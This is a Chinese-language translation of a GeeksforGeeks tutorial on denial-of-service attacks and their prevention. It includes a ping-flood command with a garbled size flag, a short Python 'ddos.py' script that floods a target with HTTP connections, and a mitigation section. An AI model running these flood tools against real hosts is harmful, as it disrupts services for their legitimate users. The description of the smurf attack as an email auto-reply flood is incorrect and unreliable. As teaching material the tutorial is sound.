# 拒绝服务与防范

> 原文:[https://www.geeksforgeeks.org/deniel-service-prevention/](https://www.geeksforgeeks.org/deniel-service-prevention/)

拒绝服务(DoS)是对单个计算机或网站的网络攻击，目的是拒绝向目标用户提供服务。他们的目的是通过拒绝用户访问来破坏组织的网络运行。拒绝服务通常是通过用多余的请求淹没目标机器或资源来实现的，以试图使系统过载并阻止部分或全部合法请求得到满足。
例如，如果一个银行网站点击“登录”按钮一秒钟可以处理 10 个人，那么攻击者只需要每秒发送 10 个虚假请求就可以成功，这样就没有合法用户可以登录。

DoS 攻击利用了计算机网络技术中的各种弱点。它们可能以服务器、网络路由器或网络通信链路为目标。它们会导致计算机和路由器崩溃，链路瘫痪。

最著名的 DoS 技术是死亡之平。Ping of Death 攻击通过生成和发送特殊的网络消息(特别是非标准大小的 ICMP 数据包)来工作，这些消息会给接收它们的系统带来问题。在网络的早期，这种攻击可能会导致未受保护的互联网服务器快速崩溃。

**强烈建议在虚拟机上尝试所有描述的活动，而不是您的工作环境**

以下是在 IP 上执行请求泛洪的命令

```
ping ip_address –t -65500
```

这里，

*   “ping”将数据包发送给受害者。
*   “ip_address”是受害者的 ip 地址。
*   “-t”表示数据包应该一直发送到程序停止为止。
*   “-l(65500)”指定要发送给受害者的数据负载。

其他基本类型的 DoS 攻击包括

*   用无用的活动淹没网络，使真正的流量无法通过。TCP/IP SYN 和 smurf 攻击是两个常见的例子。
*   远程超载系统的中央处理器，使有效的请求无法处理。
*   更改权限或破坏授权逻辑以阻止用户登录系统。一个常见的例子是触发一系列快速的错误登录尝试，锁定帐户无法登录。
*   删除或干扰特定的关键应用程序或服务，以阻止其正常运行(即使系统和网络总体上正常运行)。

DoS 的另一个变种是[蓝精灵攻击](https://en.wikipedia.org/wiki/Smurf_attack)。这包括自动回复的电子邮件。如果有人向组织中数百人发送数百封带有虚假回复电子邮件地址的电子邮件，并且他们的电子邮件中有自动回复功能，那么最初发送的邮件可能会变成数千封发送到虚假电子邮件地址的邮件。如果那个假的电子邮件地址真的属于某个人，这可能会淹没那个人的账户。

DoS 攻击会导致以下问题:

*   无效服务
*   无法访问的服务
*   网络流量中断
*   连接干扰

下面是 python 脚本，用于为一个没想到会有这么多套接字连接的小网站执行拒绝服务攻击

```
# Please note that running this code might
# cause your IP blocked by server. And purpose
# of this code is only learning.
import socket, sys, os  
print "][ Attacking " + sys.argv[1]  + " ... ]["  
print "injecting " + sys.argv[2];  
def attack():  
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  
    print ">> GET /" + sys.argv[2] + " HTTP/1.1"  
    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close()  

# Driver code
for i in range(1, 1000):  
    attack() 
```

我们可以将上面的代码用作

```
python ddos.py target_ip_address apache
```

**预防**

鉴于拒绝服务(DoS)攻击变得越来越频繁，现在是回顾基础知识以及我们如何反击的好时机。

*   **云缓解提供商**–云缓解提供商是从云中提供 DDoS 缓解的专家。这意味着他们在互联网上的多个站点建立了大量的网络带宽和分布式拒绝服务缓解能力，可以接收任何类型的网络流量，无论您使用多个互联网服务提供商、您自己的数据中心还是任何数量的云提供商。他们可以为您清理流量，只向您的数据中心发送“干净”的流量。
*   **防火墙**–这是最简单也是最不有效的方法。一般来说，有人会编写一些 Python 脚本，试图过滤掉不良流量，或者企业会尝试使用其现有的防火墙来阻止流量
*   **互联网服务提供商(ISP)**–一些企业利用其 ISP 提供 DDoS 缓解。这些互联网服务提供商拥有比企业更多的带宽，这有助于应对大容量攻击

为了防范这些攻击，您必须应用安全编码并设计强大的体系结构，以防止这些类型的攻击，并更新日常解决方案来解决您网站上的漏洞。

**参考文献**T2[https://www.owasp.org/index.php/Denial_of_Service](https://www.owasp.org/index.php/Denial_of_Service)T5[https://en.wikipedia.org/wiki/Denial-of-service_attack](https://en.wikipedia.org/wiki/Denial-of-service_attack)

本文由**阿卡什·莎兰**供稿。如果你喜欢 GeeksforGeeks 并想投稿，你也可以使用[write.geeksforgeeks.org](https://write.geeksforgeeks.org)写一篇文章或者把你的文章邮寄到 review-team@geeksforgeeks.org。看到你的文章出现在极客博客主页上，帮助其他极客。

如果你发现任何不正确的地方，或者你想分享更多关于上面讨论的话题的信息，请写评论。